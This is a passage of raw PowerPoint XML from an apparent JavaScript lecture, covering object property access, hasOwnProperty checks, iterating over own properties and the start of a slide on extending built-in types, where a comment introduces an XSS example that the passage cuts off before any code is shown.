              <a:t>Class-Based assumes world is more or less static at least when it comes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>to hierarchies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and attributes and abilities of things</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Multiple inheritance is possible with some programming languages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>More commonly used and understood.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10889367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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65CDC147-F558-42CA-8943-C0ED2F87D361}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>JavaScript Object Examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103427" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00F89BB7-65C8-41BE-99AF-24A53D8A175E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Jack"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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"1234"</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Jill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Smith"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'555'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</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"Bull Gates"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>] = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"666"</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new</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property</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</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"Jack"</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read</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property</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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">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Jack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"56789"</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set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>property</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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check</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if</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property</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exists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>modify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> it</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</a:t>
            </a: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d</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hasOwnProperty</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Jill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Smith"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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d</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Jill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Smith'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>] = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"555"</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">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Jill</a:t>
            </a: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Smith</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"999"</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fails</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because</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property</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names</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cannot</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have</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whitespace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> */</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204"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7FDE525-4379-4D54-881E-5D9EC1698B09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Iterating Through Own Properties</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{259A671C-A924-4162-A357-F16A9DEDE20D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// iterate through all own properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a: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property</a:t>
            </a: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of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getOwnPropertyNames</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o</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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property</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// does the same</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a: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property</a:t>
            </a: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in</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obj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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property</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15603768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E6752C1C-ABB9-4C0F-8BFF-1666A5ECA294}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Extending Built-In Types</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105475" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{272DFBD9-81AA-4B7E-8185-7179FE4F9F86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s</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"cat"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>example</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> of XSS = Cross </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Site</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Scripting </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
